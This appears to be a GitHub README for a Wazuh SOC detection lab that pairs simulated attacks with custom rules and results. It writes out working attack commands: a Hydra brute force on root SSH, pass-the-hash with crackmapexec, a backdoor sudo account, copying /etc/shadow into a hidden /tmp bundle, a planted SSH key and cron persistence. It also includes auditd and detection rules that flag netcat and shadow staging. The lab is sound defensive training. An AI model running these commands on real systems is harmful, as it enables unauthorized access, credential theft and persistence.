# Wazuh SOC Engineer Simulation Lab

<p align="center">
  <img src="https://img.shields.io/badge/Wazuh-4.14.5-3585F9?style=for-the-badge&labelColor=000000"/>
  <img src="https://img.shields.io/badge/Ubuntu-24.04.4_LTS-E95420?style=for-the-badge&logo=ubuntu&labelColor=000000"/>
  <img src="https://img.shields.io/badge/Attacker-Kali_Linux-557C94?style=for-the-badge&logo=kali-linux&labelColor=000000"/>
  <img src="https://img.shields.io/badge/Detection_Rate-13%2F13-22c55e?style=for-the-badge&labelColor=000000"/>
</p>

> **Lab Use Only** — Isolated network environment. Do not run against production systems.
> All 9 attack techniques were detected. 13 custom rules fired. 100% detection rate.

---

## Attack Phases Summary

| # | Technique | MITRE ATT&CK | Alert Level | Result |
|---|---|---|---|---|
| 1 | Nmap Reconnaissance | [T1046](https://attack.mitre.org/techniques/T1046/) | Info | ✅ DETECTED |
| 2 | SSH Brute Force | [T1110.001](https://attack.mitre.org/techniques/T1110/001/) | 14 | ✅ DETECTED |
| 3 | SMB Enumeration | [T1135](https://attack.mitre.org/techniques/T1135/) | 8 | ✅ DETECTED |
| 4 | NTLM Hash + Pass-the-Hash | [T1550.002](https://attack.mitre.org/techniques/T1550/002/) | 10 | ✅ DETECTED |
| 5 | User Account Creation | [T1136.001](https://attack.mitre.org/techniques/T1136/001/) | 12 | ✅ DETECTED |
| 6 | Password Hash Written to Shadow | [T1003.008](https://attack.mitre.org/techniques/T1003/008/) | 13 | ✅ DETECTED |
| 7 | Backdoor SSH Key | [T1098.004](https://attack.mitre.org/techniques/T1098/004/) | 13 | ✅ DETECTED |
| 8 | Crontab Persistence | [T1053.003](https://attack.mitre.org/techniques/T1053/003/) | 11 | ✅ DETECTED |
| 9 | File Staging in /tmp | [T1074.001](https://attack.mitre.org/techniques/T1074/001/) | 9 | ✅ DETECTED |

---

## Table of Contents

- [Lab Environment](#1-lab-environment)
- [Environment Configuration](#2-environment-configuration)
- [Phase 1 — Reconnaissance](#3-phase-1--reconnaissance-t1046)
- [Phase 2 — SSH Brute Force](#4-phase-2--ssh-brute-force-t1110001)
- [Phase 3 — SMB + Pass-the-Hash](#5-phase-3--smb-enumeration--pass-the-hash-t1135-t1550002)
- [Phase 4 — Account Creation + Credential Access](#6-phase-4--user-account-creation--password-hashing-t1136001-t1003008)
- [Phase 5 — Persistence](#7-phase-5--persistence-and-lateral-movement-t1098004-t1053003-t1074001)
- [Custom Detection Rules](#8-custom-detection-rules)
- [Detection Results](#9-detection-results)
- [Dashboard Queries](#10-dashboard-queries)
- [Lab Cleanup](#11-lab-cleanup)
- [Recommendations](#12-recommendations)

---

## 1. Lab Environment

### 1.1 Infrastructure

| Component | Detail |
|---|---|
| **Wazuh Server** | All-in-One: Manager + Indexer (OpenSearch) + Dashboard |
| **Platform** | Wazuh 4.14.5 |
| **Agent Target** | Ubuntu 24.04.4 LTS — Agent ID 001, v4.14.5, Status: Active |
| **Attacker** | Kali Linux (Rolling) |
| **KALI_IP** | `192.168.121.18` |
| **AGENT_IP** | `192.168.121.101` |
| **WAZUH_IP** | `192.168.121.103` |
| **Scope** | Isolated lab network only |
| **Date** | 07/06/2026 |

### 1.2 Agent Status — Verify Before Starting

```bash
# Run on: WAZUH_IP
sudo /var/ossec/bin/agent_control -l
```

Expected: Agent 001 showing `Active` status.

### 1.3 Wazuh Services Health Check

```bash
# Run on: WAZUH_IP
sudo systemctl is-active wazuh-manager wazuh-indexer wazuh-dashboard
```

Expected: Three `active` responses before running any simulation phase.

---

## 2. Environment Configuration

### 2.1 Auditd — Install and Enable

```bash
# Run on: AGENT_IP
sudo apt install -y auditd audispd-plugins
sudo systemctl enable --now auditd
sudo systemctl status auditd
```

### 2.2 Audit Rules

**File: `/etc/audit/rules.d/soc.rules` — Core Identity Monitoring**

```bash
-w /etc/passwd -p wa -k identity
-w /etc/shadow -p wa -k identity
-w /etc/sudoers -p wa -k privilege-escalation
-w /etc/ssh/sshd_config -p wa -k sshd-config
-a always,exit -F arch=b64 -S execve -k exec
-a always,exit -F arch=b64 -S openat -F exit=-EACCES -k access-denied
-w /var/log/auth.log -p wa -k auth-log-tamper
```

**File: `/etc/audit/rules.d/wazuh-lab.rules` — Lab-Specific Detection**

```bash
-w /etc/sudoers -p wa -k sudoers_change
-w /home -p wa -k home_dir_write
-w /root/.ssh -p wa -k ssh_keys
-w /var/log/samba -p rwa -k samba_activity
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/nmap -k recon_tool
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/nc -k netcat_exec
-a always,exit -F arch=b64 -S execve -F exe=/usr/sbin/useradd -k user_creation
-a always,exit -F arch=b64 -S execve -F exe=/usr/sbin/usermod -k user_mod
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/passwd -k passwd_change
```

```bash
# Apply rules
sudo augenrules --load && sudo systemctl restart auditd
```

### 2.3 Agent Log Sources — ossec.conf

Add inside `<ossec_config>` in `/var/ossec/etc/ossec.conf` on the Ubuntu agent:

```xml
<localfile>
  <log_format>audit</log_format>
  <location>/var/log/audit/audit.log</location>
</localfile>
<localfile>
  <log_format>syslog</log_format>
  <location>/var/log/samba/log.smbd</location>
</localfile>
<localfile>
  <log_format>syslog</log_format>
  <location>/var/log/auth.log</location>
</localfile>
<localfile>
  <log_format>syslog</log_format>
  <location>/var/ossec/logs/active-responses.log</location>
</localfile>
```

### 2.4 FIM — Syscheck Configuration

Add inside `<syscheck>` in `ossec.conf` on the Ubuntu agent:

```xml
<directories check_all="yes" report_changes="yes" realtime="yes">/var/spool/cron</directories>
<directories check_all="yes" report_changes="yes" realtime="yes">/home</directories>
<directories check_all="yes" report_changes="yes" realtime="yes">/tmp</directories>
<directories check_all="yes" report_changes="yes">/etc/sudoers.d</directories>
<directories check_all="yes" report_changes="yes">/etc/passwd</directories>
<directories check_all="yes" report_changes="yes">/etc/shadow</directories>
```

```bash
# Apply config
sudo systemctl restart wazuh-agent
```

### 2.5 Samba — SMB Share Setup

```bash
# Run on: AGENT_IP
sudo apt install -y samba samba-common-bin
```

Add to `/etc/samba/smb.conf`:

```ini
[labshare]
   path = /srv/labshare
   valid users = labsmb
   read only = yes
   browseable = yes
```

```bash
sudo mkdir -p /srv/labshare
echo 'simulation_data' | sudo tee /srv/labshare/data.txt
sudo useradd -M -s /usr/sbin/nologin labsmb
echo -e 'SmbL@bPass1\nSmbL@bPass1' | sudo smbpasswd -a -s labsmb
sudo systemctl restart smbd nmbd
# Verify SMB is listening
sudo ss -tlnp | grep 445
```

### 2.6 Kali — Offensive Tools

```bash
# Run on: KALI_IP
sudo apt update && sudo apt install -y \
  crackmapexec hydra impacket-scripts \
  nmap smbclient enum4linux-ng responder

# Verify connectivity to target
ping -c 3 AGENT_IP
nmap -p 22,445 AGENT_IP --open
```

### 2.7 Generate Backdoor SSH Key on Kali

```bash
# Run on: KALI_IP
ssh-keygen -t ed25519 -f ~/.ssh/lab_backdoor -C 'kali-backdoor' -N ''
```

---

## 3. Phase 1 — Reconnaissance (T1046)

> **MITRE ATT&CK — T1046: Network Service Discovery**
> Tactic: Discovery | Tool: Nmap 7.99 | Detection: auditd `recon_tool` key + Wazuh IDS

### 3.1 Quick SMB Port Scan

```bash
# Run on: KALI_IP
nmap -p 139,445 AGENT_IP
```

### 3.2 Full Service + OS Detection Scan

```bash
# Run on: KALI_IP
nmap -sV -sC -O -T4 --reason AGENT_IP -oN /tmp/lab_scan.txt
```

> **Key Finding — SMB Signing Disabled**
> Default Samba config has `message_signing: disabled` — NTLM hash authentication is accepted without cleartext credentials.
> Fix: add `server signing = mandatory` to `/etc/samba/smb.conf`

---

## 4. Phase 2 — SSH Brute Force (T1110.001)

> **MITRE ATT&CK — T1110.001: Password Guessing**
> Tactic: Credential Access | Tool: Hydra v9.7 + rockyou.txt (14,344,399 passwords)
> Detection: Rule 100101 (Level 14) — confirmed firing

### 4.1 Execute Brute Force

```bash
# Run on: KALI_IP
hydra -l root -P /usr/share/wordlists/rockyou.txt \
  ssh://AGENT_IP \
  -t 4 -V -f \
  -o /tmp/hydra_result.txt
```

### 4.2 Verify Detection in Wazuh

```bash
# Run on: WAZUH_IP
sudo tail -f /var/ossec/logs/alerts/alerts.log | grep -E '100100|100101|root'
```

**Detection Confirmed — Phase 2**
- Rule 100100 (L12): SSH brute force storm — 8+ failures from KALI_IP within 60s
- Rule 100101 (L14): SSH brute force targeting root — fired continuously
- MITRE: T1110.001 | PCI DSS: 10.2.4 | GDPR: IV_32.2

---

## 5. Phase 3 — SMB Enumeration + Pass-the-Hash (T1135, T1550.002)

> **MITRE ATT&CK — T1135 + T1550.002**
> T1135: Network Share Discovery | T1550.002: Pass the Hash
> Detection: Samba PAM events, port change rule 533, rule 100201

### 5.1 SMB Enumeration

```bash
# Run on: KALI_IP
enum4linux-ng -A AGENT_IP 2>&1 | tee /tmp/enum_result.txt
```

### 5.2 Compute NTLM Hash

```python
# Run on: KALI_IP
python3 -c "
import hashlib, binascii
password = 'SmbL@bPass1'
ntlm = hashlib.new('md4', password.encode('utf-16le')).digest()
print('NTLM hash:', binascii.hexlify(ntlm).decode())
"
```

### 5.3 Credential Spray + Pass-the-Hash Auth

```bash
# Run on: KALI_IP
# Step 1: Spray with wrong passwords (generates NTLM failure logs)
crackmapexec smb AGENT_IP -u labsmb -p badpass1 badpass2 badpass3

# Step 2: Authenticate using NTLM hash (no cleartext password)
crackmapexec smb AGENT_IP -u labsmb -H <NTLM_HASH_FROM_ABOVE> --shares
```

### 5.4 Verify Detection

```bash
# Run on: WAZUH_IP
sudo tail -f /var/ossec/logs/alerts/alerts.log | grep -E 'Rule|smb|samba|User|srcip'
```

**Detection Confirmed — Phase 3**
- Rule 5501: Samba PAM session opened for `labsmb` — NTLM auth accepted
- Rule 533 (L7): New port opened by smbd process
- Rule 5402: Sudo to root executed via Samba chain
- Rule 100201 (L8): NTLM auth rejection pattern in Samba logs

---

## 6. Phase 4 — User Account Creation + Password Hashing (T1136.001, T1003.008)

> **MITRE ATT&CK — T1136.001 + T1003.008**
> T1136.001: Create Local Account | T1003.008: /etc/shadow Credential Access
> Detection: auditd `user_creation` + `passwd_change` keys + FIM on shadow/passwd

### 6.1 SSH Into Target

```bash
# Run on: KALI_IP
ssh labuser@AGENT_IP
```

### 6.2 Create Backdoor Account

```bash
# Run on: AGENT_IP (as labuser)
# Create account with sudo access
sudo useradd -m -s /bin/bash -G sudo svcmonitor

# Set password (writes hash to /etc/shadow)
echo -e 'H4x0rP4ss!\nH4x0rP4ss!' | sudo passwd svcmonitor

# Add to shadow group
sudo usermod -aG shadow svcmonitor

# Verify hash written
sudo grep 'svcmonitor' /etc/shadow | cut -d: -f1-2
```

### 6.3 Sudoers Drop — Privilege Escalation Path

```bash
# Run on: AGENT_IP (as labuser)
echo 'svcmonitor ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/svcmonitor
sudo chmod 440 /etc/sudoers.d/svcmonitor
```

### 6.4 Stage /etc/shadow Copy in /tmp

```bash
# Run on: AGENT_IP
sudo cp /etc/shadow /tmp/.shadow_backup
sudo tar -czf /tmp/.exfil_bundle.tar.gz /tmp/.shadow_backup 2>/dev/null
ls -la /tmp/.shadow_backup /tmp/.exfil_bundle.tar.gz
```

### 6.5 Verify Detection

```bash
# Run on: WAZUH_IP
sudo tail -f /var/ossec/logs/alerts/alerts.log | grep -E '10011[0-6]|shadow|passwd'
```

**Detection Chain — Phase 4 (all within 30 seconds)**
- Rule 100110 (L12): auditd — useradd syscall captured (key: user_creation)
- Rule 100111 (L11): auditd — passwd command executed (key: passwd_change)
- Rule 100112 (L13): FIM — /etc/shadow modified, new hash written
- Rule 100113 (L12): FIM — /etc/passwd modified, new account entry
- Rule 100114 (L12): auditd — usermod executed (key: user_mod)
- Rule 100116 (L14): FIM — /etc/sudoers drop detected

---

## 7. Phase 5 — Persistence and Lateral Movement (T1098.004, T1053.003, T1074.001)

> **MITRE ATT&CK — T1098.004 + T1053.003 + T1074.001**
> T1098.004: Backdoor SSH key | T1053.003: Crontab persistence | T1074.001: Data staging
> Detection: FIM realtime on /home, /var/spool/cron, /tmp

### 7.1 Plant Backdoor SSH Key

```bash
# Run on: AGENT_IP (as labuser)
mkdir -p ~/.ssh
cat ~/.ssh/lab_backdoor.pub >> ~/.ssh/authorized_keys
tail -1 ~/.ssh/authorized_keys
```

### 7.2 Add Crontab Persistence

```bash
# Run on: AGENT_IP (as labuser)
(crontab -l 2>/dev/null; echo '*/5 * * * * /tmp/.svc_update.sh') | crontab -
echo '#!/bin/bash' > /tmp/.svc_update.sh
chmod +x /tmp/.svc_update.sh
```

### 7.3 Verify All Persistence Detections

```bash
# Run on: WAZUH_IP
sudo tail -f /var/ossec/logs/alerts/alerts.log | grep -E '100300|100301|100303'
```

**Detection Confirmed — Phase 5**
- Rule 100301 (L13): authorized_keys modified — backdoor SSH key planted
- Rule 100303 (L11): Crontab modified — persistence mechanism added
- Rule 100300 (L9): New file in /tmp — fired per staged file
- Rule 100115 (L14): Shadow file copy in /tmp — credential staging

---

## 8. Custom Detection Rules

Create this file on the Wazuh server **before** running any simulation phase:

```bash
# Run on: WAZUH_IP
sudo nano /var/ossec/etc/rules/lab_custom_rules.xml
```

```xml
<!-- ============================================================
     Wazuh SOC Engineer Simulation Lab — Custom Rules
     Platform : Wazuh 4.14.5
     File     : /var/ossec/etc/rules/lab_custom_rules.xml
     Range    : 100100–100399
     Author   : AramEvin — Wazuh Ambassador
     ============================================================ -->
<group name="lab_attack,authentication,">

  <!-- ── T1110.001: SSH Brute Force ─────────────────────────── -->
  <rule id="100100" level="12" frequency="8" timeframe="60">
    <if_matched_sid>5760</if_matched_sid>
    <same_source_ip />
    <description>[LAB] SSH brute force: 8+ failures from same source in 60s</description>
    <mitre><id>T1110.001</id></mitre>
    <group>authentication_failures,gdpr_IV_32.2,pci_dss_10.2.4,</group>
  </rule>

  <rule id="100101" level="14">
    <if_sid>5760</if_sid>
    <user>root</user>
    <description>[LAB] SSH brute force targeting root account</description>
    <mitre><id>T1110.001</id></mitre>
  </rule>

  <!-- ── T1136.001: User Account Creation ───────────────────── -->
  <rule id="100110" level="12">
    <if_sid>80791</if_sid>
    <field name="audit.key">user_creation</field>
    <description>[LAB] New local user account created via useradd/adduser</description>
    <mitre><id>T1136.001</id></mitre>
    <group>account_creation,pci_dss_10.2.5,gdpr_IV_35.7.d,</group>
  </rule>

  <rule id="100111" level="11">
    <if_sid>80791</if_sid>
    <field name="audit.key">passwd_change</field>
    <description>[LAB] Password hash written — passwd command executed</description>
    <mitre><id>T1136.001</id></mitre>
    <group>account_creation,</group>
  </rule>

  <!-- ── T1003.008: /etc/shadow Credential Access ───────────── -->
  <rule id="100112" level="13">
    <if_sid>550,554</if_sid>
    <field name="file">^/etc/shadow$</field>
    <description>[LAB] /etc/shadow modified — new password hash written</description>
    <mitre><id>T1003.008</id></mitre>
    <group>account_creation,gdpr_IV_32.2,</group>
  </rule>

  <rule id="100113" level="12">
    <if_sid>550,554</if_sid>
    <field name="file">^/etc/passwd$</field>
    <description>[LAB] /etc/passwd modified — new account entry added</description>
    <mitre><id>T1136.001</id></mitre>
    <group>account_creation,</group>
  </rule>

  <rule id="100114" level="12">
    <if_sid>80791</if_sid>
    <field name="audit.key">user_mod</field>
    <description>[LAB] User account modified — usermod executed</description>
    <mitre><id>T1548.003</id></mitre>
    <group>account_creation,</group>
  </rule>

  <rule id="100115" level="14">
    <if_sid>554</if_sid>
    <field name="file">shadow</field>
    <field name="file">^/tmp</field>
    <description>[LAB] Shadow file copy staged in /tmp — credential exfil prep</description>
    <mitre><id>T1003.008</id></mitre>
    <group>credential_access,gdpr_IV_35.7.d,</group>
  </rule>

  <rule id="100116" level="14">
    <if_sid>550,554</if_sid>
    <field name="file">^/etc/sudoers</field>
    <description>[LAB] Sudoers modified — privilege escalation path established</description>
    <mitre><id>T1548.003</id></mitre>
    <group>account_creation,gdpr_IV_32.2,</group>
  </rule>

  <!-- ── T1550.002: Pass-the-Hash ───────────────────────────── -->
  <rule id="100200" level="10" frequency="5" timeframe="30">
    <if_matched_sid>5716</if_matched_sid>
    <same_source_ip />
    <description>[LAB] SMB auth failure spike — credential spray detected</description>
    <mitre><id>T1550.002</id></mitre>
  </rule>

  <rule id="100201" level="8">
    <decoded_as>samba</decoded_as>
    <match>session setup failed</match>
    <description>[LAB] Samba NTLM auth rejected — pass-the-hash indicator</description>
    <mitre><id>T1550.002</id></mitre>
  </rule>

  <!-- ── T1074.001 / T1098.004 / T1053.003: Persistence ────── -->
  <rule id="100300" level="9">
    <if_sid>554</if_sid>
    <field name="file">^/tmp</field>
    <description>[LAB] New file created in /tmp — staging or dropper activity</description>
    <mitre><id>T1074.001</id></mitre>
  </rule>

  <rule id="100301" level="13">
    <if_sid>550,554</if_sid>
    <field name="file">authorized_keys$</field>
    <description>[LAB] authorized_keys modified — backdoor SSH key planted</description>
    <mitre><id>T1098.004</id></mitre>
  </rule>

  <rule id="100303" level="11">
    <if_sid>550,554</if_sid>
    <field name="file">^/var/spool/cron</field>
    <description>[LAB] Crontab modified — scheduled persistence mechanism added</description>
    <mitre><id>T1053.003</id></mitre>
  </rule>

</group>
```

```bash
# Validate and reload rules on WAZUH_IP
sudo /var/ossec/bin/ossec-logtest -t 2>&1 | tail -5
sudo systemctl restart wazuh-manager
sudo grep -E 'ERROR' /var/ossec/logs/ossec.log | tail -5
```

---

## 9. Detection Results

### 9.1 All Custom Rules Fired

| Rule ID | Level | Description | MITRE | Tags |
|---|---|---|---|---|
| 100100 | 12 | SSH brute force: 8+ failures same source | T1110.001 | auth_failures, pci_dss_10.2.4 |
| 100101 | 14 | SSH brute force targeting root | T1110.001 | authentication |
| 100110 | 12 | New user account created via useradd | T1136.001 | account_creation |
| 100111 | 11 | Password hash written — passwd executed | T1136.001 | account_creation |
| 100112 | 13 | /etc/shadow modified — new hash written | T1003.008 | credential_access |
| 100113 | 12 | /etc/passwd modified — new account entry | T1136.001 | account_creation |
| 100114 | 12 | User account modified via usermod | T1548.003 | account_creation |
| 100115 | 14 | Shadow file copy in /tmp — credential staging | T1003.008 | credential_access |
| 100116 | 14 | Sudoers modified — privilege escalation path | T1548.003 | account_creation |
| 100201 | 8 | Samba NTLM auth rejected — PtH indicator | T1550.002 | smb |
| 100300 | 9 | New file in /tmp — staging or dropper | T1074.001 | file_staging |
| 100301 | 13 | authorized_keys modified — backdoor SSH key | T1098.004 | persistence |
| 100303 | 11 | Crontab modified — scheduled persistence | T1053.003 | persistence |

### 9.2 Overall Lab Metrics

| Metric | Value |
|---|---|
| TTPs Simulated | 9 distinct MITRE ATT&CK techniques across 5 phases |
| Custom Rules Fired | **13 of 13 — 100% detection rate** |
| Total Events | 1,070 in 24-hour window |
| Auth Failures | 32 (brute force + SMB spray) |
| Auth Successes | 142 (Samba sessions + SSH logins) |
| Detection Latency | Under 30 seconds from attack to alert |
| Severity Range | Level 8 (Low) → Level 14 (Critical) |
| MITRE Tactics | Credential Access, Discovery, Privilege Escalation, Persistence, Lateral Movement |

### 9.3 Compliance Coverage

| Framework | Controls |
|---|---|
| **PCI DSS** | 10.2.4, 10.2.5, 11.5, 2.2, 8.1.2 |
| **GDPR** | IV_32.2, IV_35.7.d, II_5.1.f |
| **HIPAA** | 164.312.c.1, 164.312.c.2 |
| **NIST 800-53** | SI.7 |
| **TSC** | PI1.4, PI1.5, CC6.1, CC6.8, CC7.2, CC7.3 |

---

## 10. Dashboard Queries

Use in: **Wazuh Dashboard → Threat Hunting → Discover**. Set the time range to match your simulation window.

```
# All lab alerts
rule.groups: "lab_attack"

# Phase 2 — SSH brute force
rule.id: (100100 OR 100101)

# Phase 4 — User creation chain
rule.id: (100110 OR 100111 OR 100112 OR 100113 OR 100114 OR 100115 OR 100116)

# Phase 5 — Persistence
rule.id: (100300 OR 100301 OR 100303)

# All critical alerts from lab
rule.level: [12 TO 15] AND rule.groups: "lab_attack"

# Filter by attacker IP
data.srcip: "KALI_IP"

# Credential access TTPs
rule.mitre.id: T1003.008 OR rule.mitre.id: T1110.001 OR rule.mitre.id: T1550.002
```

### Export Evidence to JSON

```bash
# Run on: WAZUH_IP
curl -sk -u admin:YOUR_ADMIN_PASSWORD \
  'https://WAZUH_IP:9200/wazuh-alerts-*/_search' \
  -H 'Content-Type: application/json' \
  -d '{
    "query": { "match": { "rule.groups": "lab_attack" } },
    "size": 500,
    "sort": [{ "@timestamp": "asc" }]
  }' | python3 -m json.tool > ~/lab_evidence.json
echo "Exported: $(wc -l < ~/lab_evidence.json) lines"
```

---

## 11. Lab Cleanup

Run on the Ubuntu agent after documenting all results:

```bash
# Run on: AGENT_IP

# 1. Remove backdoor accounts
sudo userdel -r svcmonitor 2>/dev/null && echo 'svcmonitor removed'
sudo userdel -r labsmb 2>/dev/null && echo 'labsmb removed'
sudo smbpasswd -x svcmonitor 2>/dev/null
sudo smbpasswd -x labsmb 2>/dev/null

# 2. Remove sudoers drops
sudo rm -f /etc/sudoers.d/svcmonitor
sudo visudo -c && echo 'Sudoers OK'

# 3. Clear crontab
crontab -r 2>/dev/null && echo 'Crontab cleared'

# 4. Remove planted SSH key
> ~/.ssh/authorized_keys && echo 'authorized_keys cleared'

# 5. Remove staged files
sudo rm -f /tmp/.shadow_backup /tmp/.passwd_dump \
           /tmp/.svc_update.sh /tmp/.exfil_bundle.tar.gz

# 6. Revert Samba config
sudo rm -rf /srv/labshare
sudo sed -i '/\[labshare\]/,/^$/d' /etc/samba/smb.conf
sudo systemctl restart smbd nmbd

# 7. Verify clean baseline
grep -E 'svcmonitor|labsmb' /etc/passwd || echo 'Clean: no lab accounts'
ls /etc/sudoers.d/
crontab -l 2>/dev/null || echo 'Clean: no crontab'
echo '=== Cleanup complete ==='
```

```bash
# Confirm agent still healthy after cleanup
sudo systemctl status wazuh-agent --no-pager | head -5
```

---

## 12. Recommendations

### 12.1 Security Hardening

- Enable SMB message signing: add `server signing = mandatory` to `/etc/samba/smb.conf` — prevents NTLM hash abuse
- Disable root SSH login: set `PermitRootLogin no` in `/etc/ssh/sshd_config`
- Deploy `fail2ban` or Wazuh Active Response to auto-block IPs triggering rule 100100
- Monitor `/etc/sudoers.d/` in production — a drop file there is a reliable persistence indicator

### 12.2 Wazuh Improvements

- Enable Active Response on the Wazuh server to auto-block the attacker IP after the brute force threshold fires
- Add a composite rule (level 15) that triggers when 3+ `lab_attack` rules fire within 5 minutes from the same source IP
- Configure email or webhook alerting on level 12+ events in the `lab_attack` group
- Build a custom Wazuh Dashboard panel scoped to the `lab_attack` rule group

### 12.3 Next Lab Ideas

- **Phase 6** — Active Response: auto-block the attacker IP after rule 100100 fires
- **Phase 7** — VirusTotal / MISP integration: enrich alerts with threat intelligence
- **Phase 8** — Cloud extension: monitor AWS CloudTrail or Azure Activity Log
- **SOC Runbook** — build a formal incident response runbook from this lab's alert chain

---

## References

| Resource | Link |
|---|---|
| Wazuh Documentation | [documentation.wazuh.com](https://documentation.wazuh.com/current/index.html) |
| MITRE ATT&CK | [attack.mitre.org](https://attack.mitre.org) |
| Wazuh Ruleset (GitHub) | [wazuh/wazuh-ruleset](https://github.com/wazuh/wazuh-ruleset) |
| Wazuh Ambassador Program | [wazuh.com/ambassador](https://wazuh.com/ambassador) |
| Wazuh Community | [community.wazuh.com](https://community.wazuh.com) |

---

<p align="center">
  <b>Wazuh SOC Engineer Simulation Lab</b> · Wazuh 4.14.5 · Ubuntu 24.04.4 LTS · Kali Linux<br/>
  Maintained by <a href="https://github.com/AramEvin">AramEvin</a> — Wazuh Ambassador
</p>
